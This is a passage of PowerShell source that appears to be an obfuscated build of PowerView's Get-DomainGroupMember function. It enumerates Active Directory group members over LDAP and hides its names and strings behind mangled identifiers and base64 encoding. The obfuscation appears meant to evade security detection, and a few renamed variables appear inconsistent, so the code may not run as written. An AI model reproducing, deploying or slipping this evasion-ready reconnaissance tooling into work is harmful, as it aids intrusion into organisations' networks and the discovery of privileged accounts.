            ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) ${/==\/\_/=\___/=\/}.distinguishedName
            if (${/==\/\_/=\___/=\/}.samaccounttype -eq 0x10000000) {
                ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
            }
            elseif (${/==\/\_/=\___/=\/}.samaccounttype -eq 0x30000000) {
                ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
            }
            ${/=\/\/\/\___/==\/} = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            ${_/=\_/=====\_/\/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQBHAHIAbwB1AHAA'))))
            ${_/=\_/=====\_/\/=}
        }
    }
}
function _/=\/\/=====\/\/== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${_/==\_____/\_/=\/=},
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${__/==\/\_/\/=\/=\_},
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\/===\/=\_____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
        if (${__/\___/\/====\_/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                ${___/\__/\_/\_/\__} = ___/\/=========\/\ @/=\___/=\__/=\/\/
                if (-not ${___/\__/\_/\_/\__}) {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAOgAgACQASQBkAGUAbgB0AGkAdAB5AA==')))
                }
                else {
                    ${____/=\/\/\/=\__/} = ${___/\__/\_/\_/\__}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                    ${/=\__/\__/=\____/} = ${___/\__/\_/\_/\__}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${__/\_/==\_/\___/=} = $Domain
                    }
                    else {
                        if (${/=\__/\__/=\____/}) {
                            ${__/\_/==\_/\___/=} = ${/=\__/\__/=\____/}.SubString(${/=\__/\__/=\____/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAATABEAEEAUAAgAG0AYQB0AGMAaABpAG4AZwAgAHIAdQBsAGUAIAB0AG8AIAByAGUAYwB1AHIAcwBlACAAbwBuACAAJwAkAHsALwA9AFwAXwBfAC8AXABfAF8ALwA9AFwAXwBfAF8AXwAvAH0AJwAsACAAbwBuAGwAeQAgAHUAcwBlAHIAIABhAGMAYwBvAHUAbgB0AHMAIAB3AGkAbABsACAAYgBlACAAcgBlAHQAdQByAG4AZQBkAC4A')))
                    ${__/\___/\/====\_/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7AC8APQBcAF8AXwAvAFwAXwBfAC8APQBcAF8AXwBfAF8ALwB9ACkAKQA=')))
                    ${__/\___/\/====\_/}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
                    ${__/====\___/==\_/} = ${__/\___/\/====\_/}.FindAll() | % {$_.Properties.distinguishedname[0]}
                }
                $Null = ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA'))))
            }
            else {
                ${_____/\_/\/=\/=\_} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                    }
                    elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                            ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                            if (-not ${__/\___/\/====\_/}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwA=')))
                            }
                        }
                    }
                    elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                    }
                    elseif (${___/=\_/\/\__/===}.Contains('\')) {
                        ${________/==\/\/==} = ${___/=\_/\/\__/===}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/=\____/===\/==\ -_/=\/=\/==\/\_/=\_ Canonical
                        if (${________/==\/\/==}) {
                            ${____/\/=\/\/=\___} = ${________/==\/\/==}.SubString(0, ${________/==\/\/==}.IndexOf('/'))
                            ${___/===\/=\___/\/} = ${___/=\_/\/\__/===}.Split('\')[1]
                            ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AD0APQBcAC8APQBcAF8AXwBfAC8AXAAvAH0AKQA=')))
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\/=\/\/=\___}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAC8APQBcAC8AXAAvAD0AXABfAF8AXwB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                            ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        }
                    }
                    else {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                    }
                }
                if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${__/\___/\/====\_/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $(${__/\___/\/====\_/}.filter)"
                try {
                    ${/\_____/=\__/==\_} = ${__/\___/\/====\_/}.FindOne()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAOgAgACQAXwA=')))
                    ${__/====\___/==\_/} = @()
                }
                ${____/=\/\/\/=\__/} = ''
                ${/=\__/\__/=\____/} = ''
                if (${/\_____/=\__/==\_}) {
                    ${__/====\___/==\_/} = ${/\_____/=\__/==\_}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if (${__/====\___/==\_/}.count -eq 0) {
                        ${_____/\/\/\/\__/=} = $False
                        ${_/=\__/\/\/\/\/=\} = 0
                        ${/=\___/=\/=\/\__/} = 0
                        while (-not ${_____/\/\/\/\__/=}) {
                            ${/=\___/=\/=\/\__/} = ${_/=\__/\/\/\/\/=\} + 1499
                            ${___/==\_/\_/\_/\_}=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsAXwAvAD0AXABfAF8ALwBcAC8AXAAvAFwALwBcAC8APQBcAH0ALQAkAHsALwA9AFwAXwBfAF8ALwA9AFwALwA9AFwALwBcAF8AXwAvAH0A')))
                            ${_/=\__/\/\/\/\/=\} += 1500
                            $Null = ${__/\___/\/====\_/}.PropertiesToLoad.Clear()
                            $Null = ${__/\___/\/====\_/}.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8APQA9AFwAXwAvAFwAXwAvAFwAXwAvAFwAXwB9AA=='))))
                            $Null = ${__/\___/\/====\_/}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            $Null = ${__/\___/\/====\_/}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
                            try {
                                ${/\_____/=\__/==\_} = ${__/\___/\/====\_/}.FindOne()
                                ${_/==\__/======\/=} = ${/\_____/=\__/==\_}.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                ${__/====\___/==\_/} += ${/\_____/=\__/==\_}.Properties.item(${_/==\__/======\/=})
                                ${____/=\/\/\/=\__/} = ${/\_____/=\__/==\_}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                ${/=\__/\__/=\____/} = ${/\_____/=\__/==\_}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                                if (${__/====\___/==\_/}.count -eq 0) {
                                    ${_____/\/\/\/\__/=} = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${_____/\/\/\/\__/=} = $True
                            }
                        }
                    }
                    else {
                        ${____/=\/\/\/=\__/} = ${/\_____/=\__/==\_}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        ${/=\__/\__/=\____/} = ${/\_____/=\__/==\_}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                        ${__/====\___/==\_/} += ${/\_____/=\__/==\_}.Properties.item(${_/==\__/======\/=})
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${__/\_/==\_/\___/=} = $Domain
                    }
                    else {
                        if (${/=\__/\__/=\____/}) {
                            ${__/\_/==\_/\___/=} = ${/=\__/\__/=\____/}.SubString(${/=\__/\__/=\____/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                }
            }
            ForEach (${/=\/\/\__/==\____} in ${__/====\___/==\_/}) {
                if (${_/==\_____/\_/=\/=} -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    ${_/\/\/=\_/===\_/\} = ${/=\___/=\__/=\/\/}.Clone()
                    ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/\/\__/==\____}
                    ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                    ${_/\/\/=\_/===\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAGMAdABjAGwAYQBzAHMA')))
                    $Object = ___/\___/\__/===\/ @_/\/\/=\_/===\_/\
                    $Properties = $Object.Properties
                }
                if ($Properties) {
                    ${__/\_/=========\_} = New-Object PSObject
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${__/\_/==\_/\___/=}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${____/=\/\/\/=\__/}
                    ${__/\_/=========\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${/=\__/\__/=\____/}
                    if ($Properties.objectsid) {
                        ${/==\/===\/\/\_/==} = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        ${/==\/===\/\/\_/==} = $Null
                    }
                    try {
                        ${__/=\_/\/====\/=\} = $Properties.distinguishedname[0]
                        if (${__/=\_/\/====\/=\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcwB8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
                                if (-not ${/==\/===\/\/\_/==}) {
                                    ${/==\/===\/\/\_/==} = $Properties.cn[0]
                                }
                                ${___/\/==\_/\/\/=\} = __/=\____/===\/==\ -Identity ${/==\/===\/\/\_/==} -_/=\/=\/==\/\_/=\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) @/==\/===\/=\_____
